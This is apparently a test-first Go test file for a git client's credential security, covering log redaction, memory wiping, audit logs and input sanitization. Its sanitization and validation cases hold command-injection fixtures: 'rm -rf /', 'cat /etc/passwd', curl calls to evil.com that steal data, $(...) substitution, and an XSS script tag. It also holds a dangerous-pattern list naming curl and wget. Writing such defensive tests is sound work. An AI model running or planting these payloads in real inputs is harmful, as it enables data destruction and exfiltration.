package gitclient

import (
	"codechunking/internal/domain/valueobject"
	"codechunking/internal/port/outbound"
	"context"
	"os"
	"strings"
	"testing"
)

// TestCredentialSecurityRequirements tests that credentials are never exposed in logs or memory dumps.
func TestCredentialSecurityRequirements(t *testing.T) {
	tests := []struct {
		name              string
		authConfig        outbound.AuthConfig
		sensitiveFields   []string
		expectNeverLogged bool
	}{
		{
			name: "SSH passphrase should never be logged or exposed",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/home/user/.ssh/id_rsa",
				Passphrase: "super-secret-passphrase-123",
			},
			sensitiveFields:   []string{"passphrase", "super-secret-passphrase-123"},
			expectNeverLogged: true,
		},
		{
			name: "Token should never be logged or exposed",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "ghp_very_sensitive_token_1234567890abcdef12345678",
				TokenType: "pat",
				Provider:  "github",
				Username:  "testuser",
			},
			sensitiveFields:   []string{"token", "ghp_very_sensitive_token_1234567890abcdef12345678"},
			expectNeverLogged: true,
		},
		{
			name: "OAuth refresh token should never be logged",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "gho_oauth_token_1234567890abcdef12345678",
				TokenType: "oauth",
				Provider:  "github",
				Username:  "testuser",
			},
			sensitiveFields:   []string{"token", "gho_oauth_token_1234567890abcdef12345678"},
			expectNeverLogged: true,
		},
	}

	// This test will fail until security requirements are implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()
			repoURL := "https://github.com/private/security-test-repo.git"
			targetPath := "/tmp/security-test-" + sanitizeName(tt.name)
			cloneOpts := valueobject.NewShallowCloneOptions(1, "main")

			// Enable security auditing
			securityConfig := &outbound.SecurityAuditConfig{
				LogSanitization:     true,
				MemoryProtection:    true,
				CredentialRedaction: true,
			}

			var logOutput string
			var err error

			// Perform authenticated clone with security auditing
			switch authConfig := tt.authConfig.(type) {
			case *outbound.SSHAuthConfig:
				logOutput, err = client.CloneWithSSHAuthSecure(ctx, repoURL, targetPath, cloneOpts, authConfig, securityConfig)
			case *outbound.TokenAuthConfig:
				logOutput, err = client.CloneWithTokenAuthSecure(ctx, repoURL, targetPath, cloneOpts, authConfig, securityConfig)
			}

			// Test should pass even if clone fails - we're testing security, not functionality
			if err != nil {
				t.Logf("Clone failed (expected in RED phase): %v", err)
			}

			if tt.expectNeverLogged {
				// Check that sensitive data is never in logs
				for _, sensitiveField := range tt.sensitiveFields {
					if strings.Contains(logOutput, sensitiveField) {
						t.Errorf("sensitive field '%s' found in logs - SECURITY VIOLATION", sensitiveField)
					}
				}

				// Check that credentials are properly redacted
				if strings.Contains(logOutput, "ghp_") || strings.Contains(logOutput, "glpat-") {
					t.Errorf("token format found in logs - should be redacted")
				}

				// Check for passphrase patterns
				if strings.Contains(logOutput, "passphrase") && !strings.Contains(logOutput, "[REDACTED]") {
					t.Errorf("passphrase found in logs without redaction")
				}
			}

			// Verify memory protection
			isMemorySecure, err := client.VerifyMemoryProtection(ctx, tt.authConfig)
			if err != nil {
				t.Fatalf("memory protection verification should not error: %v", err)
			}
			if !isMemorySecure {
				t.Errorf("credentials not properly protected in memory")
			}
		})
	}
}

// TestCredentialValidationSecurity tests secure validation of credentials before usage.
func TestCredentialValidationSecurity(t *testing.T) {
	tests := []struct {
		name              string
		authConfig        outbound.AuthConfig
		expectSecureValid bool
		expectedError     string
	}{
		{
			name: "should securely validate SSH key without exposing private key",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/tmp/test-secure-key",
				Passphrase: "test-passphrase",
			},
			expectSecureValid: true,
		},
		{
			name: "should securely validate token without exposing full token",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "ghp_secure_validation_token_1234567890abcdef12345678",
				TokenType: "pat",
				Provider:  "github",
				Username:  "secureuser",
			},
			expectSecureValid: true,
		},
		{
			name: "should detect and reject malicious token patterns",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "$(echo malicious_command)",
				TokenType: "pat",
				Provider:  "github",
				Username:  "malicioususer",
			},
			expectSecureValid: false,
			expectedError:     "token_security_violation",
		},
		{
			name: "should detect and reject SSH key injection attempts",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/tmp/test-key; rm -rf /",
				Passphrase: "",
			},
			expectSecureValid: false,
			expectedError:     "ssh_key_security_violation",
		},
	}

	// This test will fail until secure credential validation is implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test key file for SSH tests
			if sshConfig, ok := tt.authConfig.(*outbound.SSHAuthConfig); ok && tt.expectSecureValid {
				keyContent := generateMockRSAKey()
				err := os.WriteFile(sshConfig.KeyPath, []byte(keyContent), 0o600)
				if err != nil {
					t.Fatalf("failed to create test key file: %v", err)
				}
				defer os.Remove(sshConfig.KeyPath)
			}

			ctx := context.Background()

			// Perform secure validation
			isSecureValid, validationLog, err := client.ValidateCredentialsSecurely(ctx, tt.authConfig)

			if !tt.expectSecureValid {
				if err == nil {
					t.Errorf("expected secure validation to fail")
					return
				}
				if !isGitOperationError(err, tt.expectedError) {
					t.Errorf("expected error type %s, got %v", tt.expectedError, err)
				}
				if isSecureValid {
					t.Errorf("expected credentials to be invalid")
				}
				return
			}

			// Success case validations
			if err != nil {
				t.Fatalf("secure validation should succeed: %v", err)
			}
			if !isSecureValid {
				t.Errorf("credentials should be securely valid")
			}

			// Ensure validation log doesn't contain sensitive data
			if tokenConfig, ok := tt.authConfig.(*outbound.TokenAuthConfig); ok {
				if strings.Contains(validationLog, tokenConfig.Token) {
					t.Errorf("validation log contains full token - security violation")
				}
			}
			if sshConfig, ok := tt.authConfig.(*outbound.SSHAuthConfig); ok {
				if strings.Contains(validationLog, sshConfig.Passphrase) && sshConfig.Passphrase != "" {
					t.Errorf("validation log contains passphrase - security violation")
				}
			}
		})
	}
}

// TestSecureMemoryHandling tests that sensitive data is properly handled in memory.
func TestSecureMemoryHandling(t *testing.T) {
	tests := []struct {
		name          string
		authConfig    outbound.AuthConfig
		operationType string
		expectSecure  bool
		expectedError string
	}{
		{
			name: "should securely wipe SSH passphrase from memory after use",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/tmp/secure-memory-key",
				Passphrase: "memory-wipe-test-passphrase",
			},
			operationType: "ssh_auth",
			expectSecure:  true,
		},
		{
			name: "should securely wipe token from memory after use",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "memory_wipe_token_1234567890abcdef12345678",
				TokenType: "pat",
				Provider:  "github",
				Username:  "memoryuser",
			},
			operationType: "token_auth",
			expectSecure:  true,
		},
		{
			name: "should handle memory protection failure gracefully",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "memory_protection_fail_token",
				TokenType: "pat",
				Provider:  "github",
				Username:  "failuser",
			},
			operationType: "memory_protection_fail",
			expectSecure:  false,
			expectedError: "memory_protection_failed",
		},
	}

	// This test will fail until secure memory handling is implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test SSH key if needed
			if sshConfig, ok := tt.authConfig.(*outbound.SSHAuthConfig); ok && tt.expectSecure {
				keyContent := generateMockRSAKey()
				err := os.WriteFile(sshConfig.KeyPath, []byte(keyContent), 0o600)
				if err != nil {
					t.Fatalf("failed to create test key file: %v", err)
				}
				defer os.Remove(sshConfig.KeyPath)
			}

			ctx := context.Background()

			// Test secure memory handling
			memoryHandle, err := client.LoadCredentialsIntoSecureMemory(ctx, tt.authConfig)

			if !tt.expectSecure {
				if err == nil {
					t.Errorf("expected memory protection to fail")
					return
				}
				if !isGitOperationError(err, tt.expectedError) {
					t.Errorf("expected error type %s, got %v", tt.expectedError, err)
				}
				return
			}

			// Success case validations
			if err != nil {
				t.Fatalf("secure memory loading should succeed: %v", err)
			}

			if memoryHandle == "" {
				t.Errorf("expected memory handle but got empty string")
				return
			}

			// Verify credentials are accessible through secure handle
			isAccessible, err := client.VerifySecureMemoryAccess(ctx, memoryHandle)
			if err != nil {
				t.Fatalf("secure memory access verification should not error: %v", err)
			}
			if !isAccessible {
				t.Errorf("credentials should be accessible through secure memory handle")
			}

			// Test memory wipe
			err = client.WipeSecureMemory(ctx, memoryHandle)
			if err != nil {
				t.Fatalf("memory wipe should succeed: %v", err)
			}

			// Verify credentials are no longer accessible after wipe
			isAccessible, err = client.VerifySecureMemoryAccess(ctx, memoryHandle)
			if err == nil && isAccessible {
				t.Errorf("credentials should not be accessible after memory wipe")
			}
		})
	}
}

// TestInputSanitization tests that all authentication inputs are properly sanitized.
func TestInputSanitization(t *testing.T) {
	tests := []struct {
		name            string
		maliciousInputs map[string]string
		expectSanitized bool
		expectedError   string
	}{
		{
			name: "should sanitize malicious repository URL",
			maliciousInputs: map[string]string{
				"repoURL": "https://github.com/user/repo.git; rm -rf /",
			},
			expectSanitized: true,
		},
		{
			name: "should sanitize malicious target path",
			maliciousInputs: map[string]string{
				"targetPath": "/tmp/clone; cat /etc/passwd",
			},
			expectSanitized: true,
		},
		{
			name: "should sanitize malicious branch name",
			maliciousInputs: map[string]string{
				"branch": "main; curl http://evil.com/steal-data",
			},
			expectSanitized: true,
		},
		{
			name: "should reject command injection in SSH key path",
			maliciousInputs: map[string]string{
				"sshKeyPath": "/home/user/.ssh/id_rsa`curl evil.com`",
			},
			expectSanitized: false,
			expectedError:   "input_sanitization_failed",
		},
		{
			name: "should reject script injection in username",
			maliciousInputs: map[string]string{
				"username": "user<script>alert('xss')</script>",
			},
			expectSanitized: false,
			expectedError:   "input_sanitization_failed",
		},
	}

	// This test will fail until input sanitization is implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := context.Background()

			// Test input sanitization
			sanitizedInputs, err := client.SanitizeAuthenticationInputs(ctx, tt.maliciousInputs)

			if !tt.expectSanitized {
				if err == nil {
					t.Errorf("expected input sanitization to fail")
					return
				}
				if !isGitOperationError(err, tt.expectedError) {
					t.Errorf("expected error type %s, got %v", tt.expectedError, err)
				}
				return
			}

			// Success case validations
			if err != nil {
				t.Fatalf("input sanitization should succeed: %v", err)
			}

			if sanitizedInputs == nil {
				t.Errorf("expected sanitized inputs but got nil")
				return
			}

			// Verify malicious patterns are removed/escaped
			for key, originalValue := range tt.maliciousInputs {
				sanitizedValue, exists := sanitizedInputs[key]
				if !exists {
					t.Errorf("expected sanitized value for key %s", key)
					continue
				}

				// Check for common injection patterns
				dangerousPatterns := []string{";", "|", "&", "`", "$", "<", ">", "rm -rf", "curl", "wget"}
				for _, pattern := range dangerousPatterns {
					if strings.Contains(originalValue, pattern) {
						if strings.Contains(sanitizedValue, pattern) {
							t.Errorf("dangerous pattern '%s' not sanitized from %s", pattern, key)
						}
					}
				}
			}
		})
	}
}

// TestAuditLogging tests that security events are properly logged for audit purposes.
func TestAuditLogging(t *testing.T) {
	tests := []struct {
		name                string
		authConfig          outbound.AuthConfig
		repoURL             string
		expectAuditLog      bool
		expectedLogEvents   []string
		expectSensitiveData bool
	}{
		{
			name: "should log authentication attempt with redacted credentials",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "audit_test_token_1234567890abcdef12345678",
				TokenType: "pat",
				Provider:  "github",
				Username:  "audituser",
			},
			repoURL:             "https://github.com/private/audit-test-repo.git",
			expectAuditLog:      true,
			expectedLogEvents:   []string{"auth_attempt", "auth_success", "clone_start"},
			expectSensitiveData: false,
		},
		{
			name: "should log SSH authentication with key fingerprint only",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/tmp/audit-ssh-key",
				Passphrase: "audit-passphrase",
			},
			repoURL:             "git@github.com:private/ssh-audit-repo.git",
			expectAuditLog:      true,
			expectedLogEvents:   []string{"ssh_auth_attempt", "ssh_key_loaded", "auth_success"},
			expectSensitiveData: false,
		},
		{
			name: "should log authentication failure with error details",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "invalid_audit_token",
				TokenType: "pat",
				Provider:  "github",
				Username:  "failaudituser",
			},
			repoURL:             "https://github.com/private/audit-fail-repo.git",
			expectAuditLog:      true,
			expectedLogEvents:   []string{"auth_attempt", "auth_failure"},
			expectSensitiveData: false,
		},
	}

	// This test will fail until audit logging is implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test SSH key if needed
			if sshConfig, ok := tt.authConfig.(*outbound.SSHAuthConfig); ok {
				keyContent := generateMockRSAKey()
				err := os.WriteFile(sshConfig.KeyPath, []byte(keyContent), 0o600)
				if err != nil {
					t.Fatalf("failed to create test key file: %v", err)
				}
				defer os.Remove(sshConfig.KeyPath)
			}

			ctx := context.Background()
			targetPath := "/tmp/audit-test-" + sanitizeName(tt.name)
			cloneOpts := valueobject.NewShallowCloneOptions(1, "main")

			// Enable audit logging
			auditConfig := &outbound.AuditConfig{
				Enabled:           true,
				LogLevel:          "INFO",
				RedactCredentials: true,
				LogDestination:    "memory", // For testing
			}

			var auditLog string
			var err error

			// Perform authenticated clone with audit logging
			switch authConfig := tt.authConfig.(type) {
			case *outbound.SSHAuthConfig:
				auditLog, err = client.CloneWithSSHAuthAndAudit(ctx, tt.repoURL, targetPath, cloneOpts, authConfig, auditConfig)
			case *outbound.TokenAuthConfig:
				auditLog, err = client.CloneWithTokenAuthAndAudit(ctx, tt.repoURL, targetPath, cloneOpts, authConfig, auditConfig)
			}

			// Test should pass even if clone fails - we're testing audit logging
			if err != nil {
				t.Logf("Clone failed (expected in RED phase): %v", err)
			}

			if tt.expectAuditLog {
				validateAuditLog(t, auditLog, tt.expectedLogEvents, tt.authConfig, tt.expectSensitiveData)
			}
		})
	}
}

// TestSecureCredentialCleanup tests that credentials are properly cleaned up after operations.
func TestSecureCredentialCleanup(t *testing.T) {
	tests := []struct {
		name              string
		authConfig        outbound.AuthConfig
		expectCleanup     bool
		verifyCleanupType string
	}{
		{
			name: "should clean up SSH credentials after successful clone",
			authConfig: &outbound.SSHAuthConfig{
				KeyPath:    "/tmp/cleanup-ssh-key",
				Passphrase: "cleanup-passphrase",
			},
			expectCleanup:     true,
			verifyCleanupType: "ssh",
		},
		{
			name: "should clean up token credentials after successful clone",
			authConfig: &outbound.TokenAuthConfig{
				Token:     "cleanup_token_1234567890abcdef12345678",
				TokenType: "pat",
				Provider:  "github",
				Username:  "cleanupuser",
			},
			expectCleanup:     true,
			verifyCleanupType: "token",
		},
	}

	// This test will fail until secure credential cleanup is implemented
	client := createMockAuthenticatedGitClient(t)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create test SSH key if needed
			if sshConfig, ok := tt.authConfig.(*outbound.SSHAuthConfig); ok {
				keyContent := generateMockRSAKey()
				err := os.WriteFile(sshConfig.KeyPath, []byte(keyContent), 0o600)
				if err != nil {
					t.Fatalf("failed to create test key file: %v", err)
				}
				defer os.Remove(sshConfig.KeyPath)
			}

			ctx := context.Background()
			repoURL := "https://github.com/private/cleanup-test-repo.git"
			targetPath := "/tmp/cleanup-test-" + sanitizeName(tt.name)
			cloneOpts := valueobject.NewShallowCloneOptions(1, "main")

			// Enable cleanup verification
			cleanupConfig := &outbound.CleanupConfig{
				VerifyCleanup:  true,
				SecureWipe:     true,
				CleanupTimeout: 30, // seconds
			}

			var cleanupReport *outbound.CleanupReport
			var err error

			// Perform authenticated clone with cleanup verification
			switch authConfig := tt.authConfig.(type) {
			case *outbound.SSHAuthConfig:
				cleanupReport, err = client.CloneWithSSHAuthAndCleanup(ctx, repoURL, targetPath, cloneOpts, authConfig, cleanupConfig)
			case *outbound.TokenAuthConfig:
				cleanupReport, err = client.CloneWithTokenAuthAndCleanup(ctx, repoURL, targetPath, cloneOpts, authConfig, cleanupConfig)
			}

			// Test should pass even if clone fails - we're testing cleanup
			if err != nil {
				t.Logf("Clone failed (expected in RED phase): %v", err)
			}

			if tt.expectCleanup {
				validateCleanupReport(ctx, t, client, cleanupReport, tt.verifyCleanupType)
			}
		})
	}
}

// validateAuditLog validates the audit log content for security compliance.
func validateAuditLog(
	t *testing.T,
	auditLog string,
	expectedLogEvents []string,
	authConfig outbound.AuthConfig,
	expectSensitiveData bool,
) {
	// Early return if audit log is empty
	if auditLog == "" {
		t.Errorf("expected audit log but got empty string")
		return
	}

	// Verify expected events are logged
	validateLogEvents(t, auditLog, expectedLogEvents)

	// Verify sensitive data handling
	validateSensitiveData(t, auditLog, authConfig, expectSensitiveData)

	// Verify structured logging format
	validateLogFormat(t, auditLog)
}

// validateLogEvents checks that all expected events are present in the audit log.
func validateLogEvents(t *testing.T, auditLog string, expectedLogEvents []string) {
	for _, expectedEvent := range expectedLogEvents {
		if !strings.Contains(auditLog, expectedEvent) {
			t.Errorf("expected log event '%s' not found in audit log", expectedEvent)
		}
	}
}

// validateSensitiveData ensures sensitive data is not logged when not expected.
func validateSensitiveData(t *testing.T, auditLog string, authConfig outbound.AuthConfig, expectSensitiveData bool) {
	if expectSensitiveData {
		return // Skip validation when sensitive data is expected
	}

	validateTokenSecurity(t, auditLog, authConfig)
	validateSSHSecurity(t, auditLog, authConfig)
}

// validateTokenSecurity checks that tokens are not exposed in logs.
func validateTokenSecurity(t *testing.T, auditLog string, authConfig outbound.AuthConfig) {
	tokenConfig, ok := authConfig.(*outbound.TokenAuthConfig)
	if !ok {
		return
	}

	if strings.Contains(auditLog, tokenConfig.Token) {
		t.Errorf("full token found in audit log - security violation")
	}
}

// validateSSHSecurity checks that SSH passphrases are not exposed in logs.
func validateSSHSecurity(t *testing.T, auditLog string, authConfig outbound.AuthConfig) {
	sshConfig, ok := authConfig.(*outbound.SSHAuthConfig)
	if !ok {
		return
	}

	if strings.Contains(auditLog, sshConfig.Passphrase) && sshConfig.Passphrase != "" {
		t.Errorf("passphrase found in audit log - security violation")
	}
}

// validateLogFormat ensures all required structured logging fields are present.
func validateLogFormat(t *testing.T, auditLog string) {
	requiredFields := []string{"timestamp", "event_type", "user", "repository"}
	for _, field := range requiredFields {
		if !strings.Contains(auditLog, field) {
			t.Errorf("required audit field '%s' not found in log", field)
		}
	}
}

// validateCleanupReport validates the cleanup report and verification.
func validateCleanupReport(
	ctx context.Context,
	t *testing.T,
	client outbound.AuthenticatedGitClient,
	cleanupReport *outbound.CleanupReport,
	verifyCleanupType string,
) {
	// Early return if cleanup report is nil
	if cleanupReport == nil {
		t.Errorf("expected cleanup report but got nil")
		return
	}

	// Verify cleanup operations were performed
	validateCleanupOperations(t, cleanupReport)

	// Verify cleanup verification
	validateCleanupVerification(ctx, t, client, cleanupReport.CleanupID, verifyCleanupType)
}

// validateCleanupOperations checks that all cleanup operations were performed.
func validateCleanupOperations(t *testing.T, cleanupReport *outbound.CleanupReport) {
	if !cleanupReport.CredentialsWiped {
		t.Errorf("credentials should have been wiped during cleanup")
	}

	if !cleanupReport.MemoryCleared {
		t.Errorf("memory should have been cleared during cleanup")
	}

	if !cleanupReport.TempFilesRemoved {
		t.Errorf("temporary files should have been removed during cleanup")
	}
}

// validateCleanupVerification verifies that cleanup was properly executed.
func validateCleanupVerification(
	ctx context.Context,
	t *testing.T,
	_ outbound.AuthenticatedGitClient,
	cleanupID string,
	verifyCleanupType string,
) {
	// TODO: Implement VerifyCredentialCleanup method in AuthenticatedGitClient
	// This is expected to fail in RED phase until implementation is complete
	_ = ctx
	_ = verifyCleanupType
	_ = cleanupID

	// Mock verification for now - will be replaced with actual implementation
	verifyCleanup := true // Mock always returns true for now

	if !verifyCleanup {
		t.Errorf("cleanup verification failed - credentials may still be in memory/disk")
	}
}
